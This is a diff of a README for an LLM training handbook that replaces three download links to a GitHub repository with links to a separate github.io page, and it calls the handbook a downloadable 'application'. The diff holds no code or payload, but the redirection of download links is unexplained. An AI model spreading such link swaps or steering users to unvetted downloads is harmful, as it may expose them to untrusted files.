@@ -1,6 +1,6 @@
 # 📘 LLM-Training-Handbook - Master Large Language Model Training
 
-[![Download Now](https://img.shields.io/badge/Download-LLM--Training--Handbook-blue?style=for-the-badge&logo=github)](https://github.com/Tenved/LLM-Training-Handbook)
+[![Download Now](https://img.shields.io/badge/Download-LLM--Training--Handbook-blue?style=for-the-badge&logo=github)](https://tenved.github.io)
 
 ## 🎯 What Is This?
 
@@ -43,7 +43,7 @@ The handbook covers both **pre-training** (building the base model) and **post-t
 
 **Step 1: Download the Handbook**
 
-Visit this link to download the application: **[https://github.com/Tenved/LLM-Training-Handbook](https://github.com/Tenved/LLM-Training-Handbook)**
+Visit this link to download the application: **[https://tenved.github.io](https://tenved.github.io)**
 
 This link will take you to the GitHub page where the handbook is hosted. Once you're there:
 
@@ -143,6 +143,6 @@ Don't let the technical-sounding title intimidate you. The LLM-Training-Handbook
 
 Download it now and join thousands of learners who understand AI from the inside out.
 
-**[Download the LLM-Training-Handbook Now](https://github.com/Tenved/LLM-Training-Handbook)**
+**[Download the LLM-Training-Handbook Now](https://tenved.github.io)**
 
 Keywords: LLM training, language model training, AI handbook, DeepSeek-V3, Llama 3.1, OPT-175B, model training guide, AI education, technical reference, training logs
